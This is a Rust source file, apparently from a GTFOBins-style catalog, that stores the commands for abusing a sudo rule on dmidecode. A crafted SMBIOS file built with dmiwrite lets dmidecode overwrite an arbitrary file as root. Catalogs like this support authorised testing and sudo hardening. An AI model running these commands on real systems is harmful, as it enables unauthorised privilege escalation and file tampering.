pub static BIN_NAME: &'static str = "dmidecode";
pub static SUDO_DESC_1: &'static str = "It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with `dmiwrite` and upload it to the target.";
pub static SUDO_CODE_1: &'static str = r#"
    
    make dmiwrite
    TF=$(mktemp)
    echo "DATA" > $TF
    ./dmiwrite $TF x.dmi
"#;
pub static SUDO_DESC_2: &'static str = "

    `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

    `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.
";
pub static SUDO_CODE_2: &'static str = r#"
    
    LFILE=file_to_write
    sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
